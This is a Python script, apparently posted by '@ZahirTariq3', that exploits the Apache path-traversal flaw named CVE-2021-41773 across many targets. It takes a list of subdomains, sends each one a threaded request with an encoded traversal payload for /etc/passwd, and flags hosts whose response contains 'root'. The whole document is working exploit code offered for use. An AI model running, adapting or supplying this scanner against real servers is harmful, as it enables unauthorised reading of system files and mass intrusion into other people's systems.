import threading
import urllib.request
import os 
import argparse
import time
from colorama import Fore

################
# @ZahirTariq3
###############

logo = ''' .d8888b.  888     888 8888888888       .d8888b.   .d8888b.   .d8888b.   d888             d8888   d888   8888888888 8888888888  .d8888b.  
d88P  Y88b 888     888 888             d88P  Y88b d88P  Y88b d88P  Y88b d8888            d8P888  d8888         d88P       d88P d88P  Y88b 
888    888 888     888 888                    888 888    888        888   888           d8P 888    888        d88P       d88P       .d88P 
888        Y88b   d88P 8888888              .d88P 888    888      .d88P   888          d8P  888    888       d88P       d88P       8888"  
888         Y88b d88P  888              .od888P"  888    888  .od888P"    888         d88   888    888    88888888   88888888       "Y8b. 
888    888   Y88o88P   888      888888 d88P"      888    888 d88P"        888  888888 8888888888   888     d88P       d88P     888    888 
Y88b  d88P    Y888P    888             888"       Y88b  d88P 888"         888               888    888    d88P       d88P      Y88b  d88P 
 "Y8888P"      Y8P     8888888888      888888888   "Y8888P"  888888888  8888888             888  8888888 d88P       d88P        "Y8888P"
 
                                                                    by @ZahirTariq3
                                                                    
                                                                    
                                                                    
                                                                    '''




print(Fore.RED+logo)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
parser = argparse.ArgumentParser()
parser.add_argument("-l","--list",help=" List of live subdomains", required=True)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
args = parser.parse_args()

vulns = []
def run_request(url):
    try:
        payload = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
        url = url.strip()

        target = str(url+"/"+payload)
        req = urllib.request.Request(target)
        s = urllib.request.urlopen(req, timeout=5)
        text = s.read().decode('utf-8')

        if "root" in text:
            print(Fore.RED+ "Vuln [!] ==> " +target)


    except Exception:
        None

def main():

    subs_list = (str(args.list)).strip()

    list_of_thread = []

    with open(subs_list,'r') as file:
        for sub in file:
            sub = sub.strip()
            new_threading = threading.Thread(target=run_request,args=[sub])
            new_threading.start()
            list_of_thread.append(new_threading)

        for thread in list_of_thread:
            thread.join()

if __name__ == '__main__':
    main()

# output file
zahir = open("result.txt",'w+')
for item in vulns:
    zahir.write(str(item))
    zahir.write('\n')
zahir.close()